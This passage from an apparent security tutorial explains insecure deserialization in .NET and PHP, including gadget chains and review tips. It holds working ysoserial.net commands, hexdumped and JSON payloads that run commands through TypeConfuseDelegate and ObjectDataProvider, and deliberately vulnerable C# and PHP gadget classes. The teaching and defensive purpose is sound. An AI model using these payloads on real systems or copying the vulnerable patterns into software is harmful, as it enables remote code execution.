00000060  00 00 00 17 42 69 6e 61  72 79 53 65 72 69 61 6c  |....BinarySerial|
00000070  69 7a 61 74 69 6f 6e 2e  52 43 45 01 00 00 00 04  |ization.RCE.....|
00000080  5f 63 6d 64 01 02 00 00  00 06 03 00 00 00 08 63  |_cmd...........c|
00000090  61 6c 63 2e 65 78 65 0b                           |alc.exe.|
00000098
```

Once deserialized by the application, it would automatically spawn a calculator on the application hosting server.

The next question would be, could it be possible to exploit it without relying on the "Damn Vulnerable" RCE class? The answer is yes, and it can be done, similarly to JAVA, by means of **POP gadgets**. 

The only exception being that each formatter holds its own exploitation methodology and its gadgets. Informally, in .NET each formatter has visibility only to certain objects types, so not every gadget can be used with a specific formatter (We'll see a manual example of that later on in this document).

#### Generate payloads dinamically: ysoserial.net

During the years, **ysoserial.net** was created, which allows to generate automatically serialized payloads using known .NET gadgets. The tool is available [here](https://github.com/pwntester/ysoserial.net/)

```
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Available formatters:
        ActivitySurrogateDisableTypeCheck (ActivitySurrogateDisableTypeCheck Gadget by Nick Landers. Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ObjectDataProvider (ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz)
                Formatters:
                        Xaml
                        Json.Net
                        FastJson
                        JavaScriptSerializer
                        XmlSerializer
                        DataContractSerializer
                        YamlDotNet < 5.0.0
        TextFormattingRunProperties (TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegate (TypeConfuseDelegate gadget by James Forshaw)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegateMono (TypeConfuseDelegate gadget by James Forshaw - Tweaked to work with Mono)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        WindowsIdentity (WindowsIdentity Gadget by Levi Broderick)
                Formatters:
                        BinaryFormatter
                        Json.Net
                        DataContractSerializer
                        SoapFormatter

Available plugins:
        ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
        Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
        ApplicationTrust (Generates XML payload for the ApplicationTrust class)
        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
        DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
        Resx (Generates RESX files)
        SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
        SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2019-0604, CVE-2018-8421)
        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
        ViewState (Generates a ViewState using known MachineKey parameters)
```


A valid payload for the example deserializer can be generated via the following command:

```
$ ysoserial-net -f BinaryFormatter -g TypeConfuseDelegate -o raw -c calc.exe > desert.ser
```

The following object would be created:

```
$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 49 53  79 73 74 65 6d 2c 20 56  |......ISystem, V|
00000020  65 72 73 69 6f 6e 3d 34  2e 30 2e 30 2e 30 2c 20  |ersion=4.0.0.0, |
00000030  43 75 6c 74 75 72 65 3d  6e 65 75 74 72 61 6c 2c  |Culture=neutral,|
00000040  20 50 75 62 6c 69 63 4b  65 79 54 6f 6b 65 6e 3d  | PublicKeyToken=|
00000050  62 37 37 61 35 63 35 36  31 39 33 34 65 30 38 39  |b77a5c561934e089|
00000060  05 01 00 00 00 84 01 53  79 73 74 65 6d 2e 43 6f  |.......System.Co|
00000070  6c 6c 65 63 74 69 6f 6e  73 2e 47 65 6e 65 72 69  |llections.Generi|
00000080  63 2e 53 6f 72 74 65 64  53 65 74 60 31 5b 5b 53  |c.SortedSet`1[[S|
00000090  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
000000a0  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
000000b0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
000000c0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
000000d0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
000000e0  36 31 39 33 34 65 30 38  39 5d 5d 04 00 00 00 05  |61934e089]].....|
000000f0  43 6f 75 6e 74 08 43 6f  6d 70 61 72 65 72 07 56  |Count.Comparer.V|
00000100  65 72 73 69 6f 6e 05 49  74 65 6d 73 00 03 00 06  |ersion.Items....|
00000110  08 8d 01 53 79 73 74 65  6d 2e 43 6f 6c 6c 65 63  |...System.Collec|
00000120  74 69 6f 6e 73 2e 47 65  6e 65 72 69 63 2e 43 6f  |tions.Generic.Co|
00000130  6d 70 61 72 69 73 6f 6e  43 6f 6d 70 61 72 65 72  |mparisonComparer|
00000140  60 31 5b 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |`1[[System.Strin|
00000150  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
00000160  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
00000170  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
00000180  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
00000190  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 5d  |7a5c561934e089]]|
000001a0  08 02 00 00 00 02 00 00  00 09 03 00 00 00 02 00  |................|
000001b0  00 00 09 04 00 00 00 04  03 00 00 00 8d 01 53 79  |..............Sy|
000001c0  73 74 65 6d 2e 43 6f 6c  6c 65 63 74 69 6f 6e 73  |stem.Collections|
000001d0  2e 47 65 6e 65 72 69 63  2e 43 6f 6d 70 61 72 69  |.Generic.Compari|
000001e0  73 6f 6e 43 6f 6d 70 61  72 65 72 60 31 5b 5b 53  |sonComparer`1[[S|
000001f0  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
00000200  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
00000210  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
00000220  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
00000230  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
00000240  36 31 39 33 34 65 30 38  39 5d 5d 01 00 00 00 0b  |61934e089]].....|
00000250  5f 63 6f 6d 70 61 72 69  73 6f 6e 03 22 53 79 73  |_comparison."Sys|
00000260  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
00000270  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 09  |alizationHolder.|
00000280  05 00 00 00 11 04 00 00  00 02 00 00 00 06 06 00  |................|
00000290  00 00 0b 2f 63 20 63 61  6c 63 2e 65 78 65 06 07  |.../c calc.exe..|
000002a0  00 00 00 03 63 6d 64 04  05 00 00 00 22 53 79 73  |....cmd....."Sys|
000002b0  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
000002c0  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 03  |alizationHolder.|
000002d0  00 00 00 08 44 65 6c 65  67 61 74 65 07 6d 65 74  |....Delegate.met|
000002e0  68 6f 64 30 07 6d 65 74  68 6f 64 31 03 03 03 30  |hod0.method1...0|
000002f0  53 79 73 74 65 6d 2e 44  65 6c 65 67 61 74 65 53  |System.DelegateS|
00000300  65 72 69 61 6c 69 7a 61  74 69 6f 6e 48 6f 6c 64  |erializationHold|
00000310  65 72 2b 44 65 6c 65 67  61 74 65 45 6e 74 72 79  |er+DelegateEntry|
00000320  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
00000330  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
00000340  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
00000350  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
00000360  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
00000370  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
00000380  09 08 00 00 00 09 09 00  00 00 09 0a 00 00 00 04  |................|
00000390  08 00 00 00 30 53 79 73  74 65 6d 2e 44 65 6c 65  |....0System.Dele|
000003a0  67 61 74 65 53 65 72 69  61 6c 69 7a 61 74 69 6f  |gateSerializatio|
000003b0  6e 48 6f 6c 64 65 72 2b  44 65 6c 65 67 61 74 65  |nHolder+Delegate|
000003c0  45 6e 74 72 79 07 00 00  00 04 74 79 70 65 08 61  |Entry.....type.a|
000003d0  73 73 65 6d 62 6c 79 06  74 61 72 67 65 74 12 74  |ssembly.target.t|
000003e0  61 72 67 65 74 54 79 70  65 41 73 73 65 6d 62 6c  |argetTypeAssembl|
000003f0  79 0e 74 61 72 67 65 74  54 79 70 65 4e 61 6d 65  |y.targetTypeName|
00000400  0a 6d 65 74 68 6f 64 4e  61 6d 65 0d 64 65 6c 65  |.methodName.dele|
00000410  67 61 74 65 45 6e 74 72  79 01 01 02 01 01 01 03  |gateEntry.......|
00000420  30 53 79 73 74 65 6d 2e  44 65 6c 65 67 61 74 65  |0System.Delegate|
00000430  53 65 72 69 61 6c 69 7a  61 74 69 6f 6e 48 6f 6c  |SerializationHol|
00000440  64 65 72 2b 44 65 6c 65  67 61 74 65 45 6e 74 72  |der+DelegateEntr|
00000450  79 06 0b 00 00 00 b0 02  53 79 73 74 65 6d 2e 46  |y.......System.F|
00000460  75 6e 63 60 33 5b 5b 53  79 73 74 65 6d 2e 53 74  |unc`3[[System.St|
00000470  72 69 6e 67 2c 20 6d 73  63 6f 72 6c 69 62 2c 20  |ring, mscorlib, |
00000480  56 65 72 73 69 6f 6e 3d  34 2e 30 2e 30 2e 30 2c  |Version=4.0.0.0,|
00000490  20 43 75 6c 74 75 72 65  3d 6e 65 75 74 72 61 6c  | Culture=neutral|
000004a0  2c 20 50 75 62 6c 69 63  4b 65 79 54 6f 6b 65 6e  |, PublicKeyToken|
000004b0  3d 62 37 37 61 35 63 35  36 31 39 33 34 65 30 38  |=b77a5c561934e08|
000004c0  39 5d 2c 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |9],[System.Strin|
000004d0  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
000004e0  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
000004f0  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
00000500  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
00000510  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 2c  |7a5c561934e089],|
00000520  5b 53 79 73 74 65 6d 2e  44 69 61 67 6e 6f 73 74  |[System.Diagnost|
00000530  69 63 73 2e 50 72 6f 63  65 73 73 2c 20 53 79 73  |ics.Process, Sys|
00000540  74 65 6d 2c 20 56 65 72  73 69 6f 6e 3d 34 2e 30  |tem, Version=4.0|
00000550  2e 30 2e 30 2c 20 43 75  6c 74 75 72 65 3d 6e 65  |.0.0, Culture=ne|
00000560  75 74 72 61 6c 2c 20 50  75 62 6c 69 63 4b 65 79  |utral, PublicKey|
00000570  54 6f 6b 65 6e 3d 62 37  37 61 35 63 35 36 31 39  |Token=b77a5c5619|
00000580  33 34 65 30 38 39 5d 5d  06 0c 00 00 00 4b 6d 73  |34e089]].....Kms|
00000590  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
000005a0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
000005b0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
000005c0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
000005d0  36 31 39 33 34 65 30 38  39 0a 06 0d 00 00 00 49  |61934e089......I|
000005e0  53 79 73 74 65 6d 2c 20  56 65 72 73 69 6f 6e 3d  |System, Version=|
000005f0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
00000600  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
00000610  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
00000620  36 31 39 33 34 65 30 38  39 06 0e 00 00 00 1a 53  |61934e089......S|
00000630  79 73 74 65 6d 2e 44 69  61 67 6e 6f 73 74 69 63  |ystem.Diagnostic|
00000640  73 2e 50 72 6f 63 65 73  73 06 0f 00 00 00 05 53  |s.Process......S|
00000650  74 61 72 74 09 10 00 00  00 04 09 00 00 00 2f 53  |tart........../S|
00000660  79 73 74 65 6d 2e 52 65  66 6c 65 63 74 69 6f 6e  |ystem.Reflection|
00000670  2e 4d 65 6d 62 65 72 49  6e 66 6f 53 65 72 69 61  |.MemberInfoSeria|
00000680  6c 69 7a 61 74 69 6f 6e  48 6f 6c 64 65 72 07 00  |lizationHolder..|
00000690  00 00 04 4e 61 6d 65 0c  41 73 73 65 6d 62 6c 79  |...Name.Assembly|
000006a0  4e 61 6d 65 09 43 6c 61  73 73 4e 61 6d 65 09 53  |Name.ClassName.S|
000006b0  69 67 6e 61 74 75 72 65  0a 53 69 67 6e 61 74 75  |ignature.Signatu|
000006c0  72 65 32 0a 4d 65 6d 62  65 72 54 79 70 65 10 47  |re2.MemberType.G|
000006d0  65 6e 65 72 69 63 41 72  67 75 6d 65 6e 74 73 01  |enericArguments.|
000006e0  01 01 01 01 00 03 08 0d  53 79 73 74 65 6d 2e 54  |........System.T|
000006f0  79 70 65 5b 5d 09 0f 00  00 00 09 0d 00 00 00 09  |ype[]...........|
00000700  0e 00 00 00 06 14 00 00  00 3e 53 79 73 74 65 6d  |.........>System|
00000710  2e 44 69 61 67 6e 6f 73  74 69 63 73 2e 50 72 6f  |.Diagnostics.Pro|
00000720  63 65 73 73 20 53 74 61  72 74 28 53 79 73 74 65  |cess Start(Syste|
00000730  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
00000740  2e 53 74 72 69 6e 67 29  06 15 00 00 00 3e 53 79  |.String).....>Sy|
00000750  73 74 65 6d 2e 44 69 61  67 6e 6f 73 74 69 63 73  |stem.Diagnostics|
00000760  2e 50 72 6f 63 65 73 73  20 53 74 61 72 74 28 53  |.Process Start(S|
00000770  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 53 79  |ystem.String, Sy|
00000780  73 74 65 6d 2e 53 74 72  69 6e 67 29 08 00 00 00  |stem.String)....|
00000790  0a 01 0a 00 00 00 09 00  00 00 06 16 00 00 00 07  |................|
000007a0  43 6f 6d 70 61 72 65 09  0c 00 00 00 06 18 00 00  |Compare.........|
000007b0  00 0d 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 06  |..System.String.|
000007c0  19 00 00 00 2b 49 6e 74  33 32 20 43 6f 6d 70 61  |....+Int32 Compa|
000007d0  72 65 28 53 79 73 74 65  6d 2e 53 74 72 69 6e 67  |re(System.String|
000007e0  2c 20 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 29  |, System.String)|
000007f0  06 1a 00 00 00 32 53 79  73 74 65 6d 2e 49 6e 74  |.....2System.Int|
00000800  33 32 20 43 6f 6d 70 61  72 65 28 53 79 73 74 65  |32 Compare(Syste|
00000810  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
00000820  2e 53 74 72 69 6e 67 29  08 00 00 00 0a 01 10 00  |.String)........|
00000830  00 00 08 00 00 00 06 1b  00 00 00 71 53 79 73 74  |...........qSyst|
00000840  65 6d 2e 43 6f 6d 70 61  72 69 73 6f 6e 60 31 5b  |em.Comparison`1[|
00000850  5b 53 79 73 74 65 6d 2e  53 74 72 69 6e 67 2c 20  |[System.String, |
00000860  6d 73 63 6f 72 6c 69 62  2c 20 56 65 72 73 69 6f  |mscorlib, Versio|
00000870  6e 3d 34 2e 30 2e 30 2e  30 2c 20 43 75 6c 74 75  |n=4.0.0.0, Cultu|
00000880  72 65 3d 6e 65 75 74 72  61 6c 2c 20 50 75 62 6c  |re=neutral, Publ|
00000890  69 63 4b 65 79 54 6f 6b  65 6e 3d 62 37 37 61 35  |icKeyToken=b77a5|
000008a0  63 35 36 31 39 33 34 65  30 38 39 5d 5d 09 0c 00  |c561934e089]]...|
000008b0  00 00 0a 09 0c 00 00 00  09 18 00 00 00 09 16 00  |................|
000008c0  00 00 0a 0b                                       |....|
```

Trying to deserialize the above object would cause a calculator to spawn on the system. As observable from the command, the gadget `TypeConfuseDelegate` was used for exploitation. The process used by this gadget is different yet similar to the one used above by the custom implemented RCE class. 

Before digging deep into the process used by `TypeConfuseDelegate`, it is necessary to describe how the Delegate class is used in the .NET architecture, and how it can be exploited by insecure deserialization in a similar way to the above RCE class. Considering the following class:

```csharp
[Serializable] 
public class WrapEvent : IDeserializationCallback
{
    Delegate _delegated;
    string _parameters;
    public WrapEvent(Delegate delegated, string parameters)
    {
        _delegated = delegated;
        _parameters = parameters;
    }
    public bool Run()
    {
        return (bool)_delegated.DynamicInvoke(_parameters);
    }

    public void OnDeserialization(object sender)
    {
        Run();
    }
}
```

How can this be exploited? The main idea is to find a way to set the `_delegate` parameter to `System.Diagnostic.Process` and `_parameters` to a command to execute. 

To achieve this result, `TypeConfuseDelegate` generates a payload operating the following steps:

1. Create a Comparison object (function to compare strings)
2. Create a MulticastDelegate with two entries, setting both of them to Comparison (current object = MulticastDelegate<Comparison(String,String),Comparison(String,String)>)
3. Create a SortedSet, and associate the ComparisonComparer as the compare function  
4. Using introspection, change the type of one of the Comparison objects to Process.Start
    * This works because, by default, Microsoft doesn't enforce type signatures of delegate objects
5. Add to the SortedSet two strings ("cmd", "args")

*Note that cmd, args could be any command - args combination*

Upon deserialization, the following would then happen:

1. To rebuild the SortedSet, the comparison function is reinitialised
2. The ComparerComparison calls the MulticastDelegate as its comparison delegate
3. To operate the comparison, the MulticastDelegate runs the Compare() and Start() functions in parallel
4. Compare() will just compare "cmd" and "arg" as strings
5. Start() will spawn a process and execute the "cmd" and "args" as OS commands

#### .NET: Text-Based Archive Format

As for JAVA, .NET is not immune to deserialization issues affecting Text-Based archive formats, such as XML, JSON, [Net]DataContract. These formats are usually handled by the following serializers:

* XmlSerializer (XML)
* [Net]DataContractSerializer (XML dialect)
* JavaScriptSerializer (JSON)

*Note: The [Net]DataContractSerializer will not be taken into consideration*

**XML**

As an example of XML Serialization, let's consider the following example:

```csharp
public static void xmlDesertDeserial(string filename) 
{
    var stream = new FileStream(filename, FileMode.Open, FileAccess.Read);
    var reader = new StreamReader(stream);
    XmlSerializer serializer = new XmlSerializer(typeof(Desert));
    // Deseriliazing a dEsert object.. isn't it?
    var desert = (Desert)serializer.Deserialize(reader);
    reader.Close();
    stream.Close();
}
```

The only valuable pieces to note are:

* The `(Desert)serializer.Deserialize(reader)` cast doesn't offer any additional protection, as the cast logically comes AFTER the deserialization process
* The `typeof(Desert)` will forbid the XmlSerializer to deserialize other Classes

Which means that even crafting an xml using the following serializer, it won't work:

```csharp
 [Serializable]
public class RCE
{
    private String _cmd = "calc.exe";
    public String cmd
    {
        get { return _cmd;  }
        set { _cmd = value; }
    }

    public void Run()
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = _cmd;
        p.Start();
        p.Dispose();
    }
}

public static void xmlRCESerial(string filename) 
{
    // Create desert name
    var rce = new RCE();
    // Persist to file
    TextWriter writer = new StreamWriter(filename + ".xml");
    XmlSerializer serializer = new XmlSerializer(typeof(Desert));
    Console.WriteLine("Serializing desert (!?)");
    serializer.Serialize(writer, rce);
    writer.Close();
} 
```

However, it is possible to exploit this function if the attacker can control the expected type of the **XmlSerializer**. 

In that case, it would be possible to craft an exploit generating the serialized verion of the **RCE** calss, or using `ysoserial.net`:

```bash
$ ysoserial-net -g ObjectDataProvider -f XmlSerializer -c "calc" -o raw
```

**JSON**

In their research, [Firday the 13th, JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf), Alvaro Muñoz and Oleksandr Mirosh explained how it was possible to apply similar methods seen for JAVA JSON deserialization to exploit .NET JSON deserialization. The research is extremely accurate, and points out a list of libraries affected by this vulnerability. As such, the article won't cover in details every library, but focus more on explaining that no concrete difference exists between JSON and XML/Binary deserialization in terms of exploitation.

The research states that, in order to successfully exploit JSON deserialization, the following conditions must be satisfied:

1. Attacker can control type of reconstructed objects [Same as binary/xml]
    * Can specify Type
        + _type, $type, class, classname, javaClass, ..., etc.
    * Library loads and instantiate Type
2. Library/GC will call methods on reconstructed objects [Setter/Getter/Constructors/Destructors, same as for binary/xml]
3. There are gadget chains starting on method executed upon/after reconstruction [Visibility constraint, same as for binary/xml]

As highlighted, there is no big difference from the constraints already presented for other archive formats.

In order to prove that, the `JavaScriptSerializer` would be taken as example. This specific serializer is not vulnerable by itself, as it doesn't permit the deserialization of non native types by default. However, it becomes vulnerable when used in combination with `SimpleTypeResolver`, as this resolver enable custom types deserialization. 
Considering the following vulnerable example:

```csharp
public static void jsonRCEDeserial(string filename)
{
    filename += ".json";
    // Vulnerable use of JavaScriptSerializer
    JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
    var stream = new FileStream(filename, FileMode.Open, FileAccess.Read);
    var reader = new StreamReader(stream);
    var desert = serializer.Deserialize<Desert>(reader.ReadToEnd());
    reader.Close();
    stream.Close();
}

[Serializable]
public class RCE 
{
    private String _cmd;
    public String cmd
    {
        get { return _cmd; }
        set
        {
            _cmd = value;
            Run();
        }
    }

    public void Run()
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = _cmd;
        p.Start();
        p.Dispose();
    }
}

[Serializable]
public class Desert
{
    private String _name;
    public String name
    {
        get { return _name; }
        set { _name = value; Console.WriteLine("Desert name: " + _name); }
    }
}
```

As observable, the serializer is unsafely used to deserialize an expected Desert object. However, the type definition on the deserializer doesn't forbid the deserialization of unknown objects, as `JavaScriptSerializer` doesn't perform any kind of whitelisting or object inspection. As such, like previously explained, the `RCE` class can be used as a valid gadget, triggering a remote command execution during the deserialization process. 

To build a successful payload, the following code can be used:

```csharp
public static void jsonRCESerial(string filename)
{
    filename += ".json";
    var desert = new RCE();
    desert.cmd = "calc.exe";
    // Persist to file
    using (StreamWriter stream = File.CreateText(filename))
    {
        Console.WriteLine("Serializing RCE");
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        stream.Write(serializer.Serialize(desert));
    }
}
```
Which would produce the following payload:

```bash
{"__type":"BinarySerialization.RCE, BinarySeriliazer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null","cmd":"calc.exe"}
```

Of course, it is also possible to generate an exploitation payload using `ysoserial.net`:

```bash
$ ysoserial-net -g ObjectDataProvider -f JavaScriptSerializer -c "calc" -o raw
{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'FileName':'cmd',
            'Arguments':'/c calc'
        }
    }
}
```

#### Tips for Source Code reviewers

To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: 

* `(JavaScript|Xml|(Net)*DataContract)Serializer`
* `(Binary|ObjectState|Los|Soap|Client|Server)Formatter`
* `Json.Net`
* `YamlDotNet`
* `FastJson`
* `Xaml`
* `TypeNameHandling`
* `SimpleTypeResolver`
* `(Serialization|Deerialize|UnsafeDeserialize)`
* `(ComponentModel.Activity|Load|Activity.Load)`
* `ResourceReader`
* `(ProxyObject|DecodeSerializedObject|DecodeValue)`
* `ServiceStack.Text`

For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.

---

### PHP

#### Native Serialization Archive

PHP offers native serialization support via its to methods `serialize()` and `unserialize()` which can be used to perform serialization and deserialization of any PHP object that should be stored, transfered or transformed. The PHP serialized object format, it's not far from a JSON array and it's human readable.

```
PHP serialized object example:
O:8:"abcd1234":1:{s:7:"AString";s:13:"AnotherString";}
```

How to read it?

* O: Object
* 8: Class Name Length
* "abcd1234": Class Name
* 1: Number of properties
* {}: Properties
* s:7: String of length 7
* s:13: String of length 13

A good example of serialized object in PHP is the session file, usually stored within `/var/lib/php5/sess_[PHPSESSID]`.

##### PHP: Differences from JAVA and .NET

The exploitation in PHP strictly depends on the application specific implementation. What does that mean? As already seen for JAVA and .NET, exploiting deserialization require chaining or exploiting class/objects which are implemented in a specific way (gadgets). That would mean that, if a PHP application was built in pure functional PHP, there would be no way to find valid POP gadgets, and that would make virtually impossible to exploit this kind of issue.
To make things more complicated, PHP libraries are not uniformly shared among PHP based frameworks/applications; as such, the process of generalizing this kind of exploit is unfeasible. 

Obviously, it doesn't mean that it's not exploitable, it means that, potentially, a different suitable vector should be found for any different application. 

To understand what to look for when hunting this kind of vulnerabilities, it is needed to deeply understand the application flow during the deserialization process.

PHP mainly serialize/deserialize data using `serialize` and `unserialize` functions. These two functions are vulnerable as long as suitable gadgets for exploitation exists, which means a deep study of the classes implemented by the application is needed in order to know if an exploitable condition exists.

Before going further, it is better to introduce PHP Magic Methods. In PHP, Magic methods are functions of the standard API to be used in Object-Oriented PHP. These methods are automatically called if certain conditions are met. The most known magic methods are:

* `__construct()` PHP class constructor, if implemented within a class, it is automatically called upon object creation
* `__destruct()` PHP class destructor, if implemented within a class, it is automatically called when references to the object are removed from memory
* `__toString()` PHP call-back that gets executed if the object is treated like a string
* `__wakeup()` PHP call-back that gets executed upon deserialization

For an exhaustive list of all PHP magic methods, refer to the following link:

* [https://www.php.net/manual/en/language.oop5.magic.php](https://www.php.net/manual/en/language.oop5.magic.php)

##### PHP: How to search for valid "gadgets"

After the call to `unserialize`, a magic method may be called on the deserialized object, which can potentially lead to an RCE.

It is possible to see how the process works analysing the following example:

```php
<?php

class RCE {

    public $cmd;
    
    function __construct($cmd){
        $this->cmd = $cmd;
    }

    function __wakeup(){
        shell_exec($this->cmd);
    }
}

class FileDelete{
    
    public $filename;
    
    function usefile(){
        // Do something
    }
    
    function __destruct(){
        unlink($this->filename);
    }
}

class Desert{
    public $name;
    
    function __construct($name){
        $this->name = $name;
        echo("[+] Constructing new desert!\n");
    }

    function __toString(){
        echo("[+] The desert is called: $this->name!\n");
        return $this->name;
    }

    function __wakeup(){
        echo("[+] New Desert created! Hello $this->name!\n");
    }

    function __destruct(){
        echo("[+] Bye Bye $this->name\n");
    }
    
}

$testfile = @fopen("test", "w+");
@fclose($testfile);

if($argc < 2){
    echo("[-] Not enough parameters");
}else if($argv[1] === "-d"){
    $desert = unserialize(file_get_contents("desert"));
}else if(($argv[1] === "-e") and ($argc > 2)){
    if($argv[2] === "desert"){
        file_put_contents("desert", serialize(new Desert("Sahara")));
    }else if($argv[2] === "rce"){
        file_put_contents("desert", serialize(new RCE("cmd /c calc")));
    }else if($argv[1] == "file-delete"){
        file_put_contents("desert", serialize(new FileDelete("test")));
    }
}
?>
```

This tiny script act as both a serializer and deserializer for three different classes, that for sake of simplicity are named in a very intuitive way, respecting the standard format of other examples provided so far.

Important things to note within the script:

* The class RCE is a valid PHP gadget for remote command execution, with the potential vector `__wakeup`
* The class FileDelete is a valid gadget for Arbitrary File Deletion, with the potential vector `__destruct`
* The class Desert is the main, good class. We'll use it to study to trace function calls during deserialization

**Function Calls**

A valid desert file can be generated using the following command:

```bash
$ php php-desert.php -e desert
[+] Constructing new desert!
[+] Bye Bye Sahara
```

